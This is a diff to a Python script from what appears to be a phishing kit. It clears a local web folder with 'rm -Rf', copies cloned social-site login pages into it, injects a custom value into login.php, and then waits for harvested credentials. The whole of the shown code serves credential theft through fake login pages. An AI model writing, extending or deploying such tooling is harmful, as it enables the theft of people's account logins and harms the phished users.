@@ -13,11 +13,17 @@
 from os import system
 from time import sleep
 from huepy import *
-
-def runPhishing(social):
-    system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')
+    
+def runPhishing(social, custom):
+    system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
     command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
     system(command)
+    with open('base/Server/www/login.php') as f:
+        read_data = f.read()   
+    c = read_data.replace('<CUST0M>', custom)
+    f = open('base/Server/www/login.php', 'w')
+    f.write(c)
+    f.close()
 
 def waitCreds():
     print(cyan(" [*] Waiting for credentials... "))
